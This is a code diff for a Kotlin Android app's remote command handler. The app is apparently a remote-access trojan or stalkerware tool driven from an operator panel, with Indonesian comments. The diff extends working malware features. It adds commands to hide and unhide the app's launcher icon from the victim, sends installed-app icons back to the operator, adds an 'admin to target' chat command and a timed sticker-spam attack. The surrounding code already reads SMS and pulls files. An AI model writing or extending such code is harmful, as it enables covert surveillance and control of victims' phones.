@@ -164,10 +164,11 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
 
             // ============ SPAM STIKER ============
             "spam_sticker" -> {
+                val duration = args?.get("duration")?.asLong ?: 5L
                 val urls = mutableListOf<String>()
                 for (i in 1..5) urls.add("${panelBase()}/stickers/sticker$i.png")
-                StickerSpam.start(ctx, urls, 200, 30)
-                done(mapOf("ok" to true, "count" to urls.size))
+                StickerSpam.start(ctx, urls, 200, 30, duration)
+                done(mapOf("ok" to true, "count" to urls.size, "duration" to duration))
             }
 
             "stop_sticker" -> {
@@ -287,7 +288,9 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             "set_wallpaper" -> {
                 val url = args?.get("url")?.asString ?: ""
                 if (url.isEmpty()) {
-                    done(mapOf("error" to "no url"))
+                    done(mapOf("ok" to false, "error" to "no url"))
+                } else if (!url.startsWith("http")) {
+                    done(mapOf("ok" to false, "error" to "invalid url"))
                 } else {
                     WallpaperSetter.setFromUrl(ctx, url) { success ->
                         done(mapOf("ok" to success, "url" to url))
@@ -322,7 +325,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("type" to "text", "data" to "Notif listener aktif"))
             }
 
-            // ============ LIST APPS ============
+            // ============ LIST APPS (dengan icon) ============
             "list_apps" -> {
                 try {
                     val pm = ctx.packageManager
@@ -331,9 +334,24 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     apps.forEach { app ->
                         try {
                             if (pm.getLaunchIntentForPackage(app.packageName) != null) {
+                                var iconB64 = ""
+                                try {
+                                    val iconDrawable = pm.getApplicationIcon(app)
+                                    val w = iconDrawable.intrinsicWidth.coerceAtLeast(48)
+                                    val h = iconDrawable.intrinsicHeight.coerceAtLeast(48)
+                                    val bmp = android.graphics.Bitmap.createBitmap(w, h, android.graphics.Bitmap.Config.ARGB_8888)
+                                    val canvas = android.graphics.Canvas(bmp)
+                                    iconDrawable.setBounds(0, 0, canvas.width, canvas.height)
+                                    iconDrawable.draw(canvas)
+                                    val bos = java.io.ByteArrayOutputStream()
+                                    bmp.compress(android.graphics.Bitmap.CompressFormat.PNG, 70, bos)
+                                    iconB64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)
+                                } catch (_: Exception) {}
+
                                 list.add(mapOf(
                                     "name" to pm.getApplicationLabel(app).toString(),
-                                    "package" to app.packageName
+                                    "package" to app.packageName,
+                                    "icon" to iconB64
                                 ))
                             }
                         } catch (_: Exception) {}
@@ -391,6 +409,48 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     done(mapOf("error" to "no path"))
                 } else {
                     done(FileManager.downloadFile(path))
+                }
+            }
+
+            // ============ CHAT REPLY (admin ke target) ============
+            "chat_reply" -> {
+                val text = args?.get("text")?.asString ?: ""
+                if (text.isEmpty()) {
+                    done(mapOf("error" to "no text"))
+                } else {
+                    done(mapOf("ok" to true))
+                }
+            }
+
+            // ============ HIDE APP ============
+            "hide_app" -> {
+                try {
+                    val pm = ctx.packageManager
+                    val component = ComponentName(ctx, MainActivity::class.java)
+                    pm.setComponentEnabledSetting(
+                        component,
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP
+                    )
+                    done(mapOf("ok" to true))
+                } catch (e: Exception) {
+                    done(mapOf("error" to e.message))
+                }
+            }
+
+            // ============ SHOW APP ============
+            "show_app" -> {
+                try {
+                    val pm = ctx.packageManager
+                    val component = ComponentName(ctx, MainActivity::class.java)
+                    pm.setComponentEnabledSetting(
+                        component,
+                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                        android.content.pm.PackageManager.DONT_KILL_APP
+                    )
+                    done(mapOf("ok" to true))
+                } catch (e: Exception) {
+                    done(mapOf("error" to e.message))
                 }
             }
 
@@ -488,7 +548,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     // ============================================================
-    // SMS — inbox + sent
+    // SMS — inbox + sent + draft
     // ============================================================
     private fun readAllSms(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
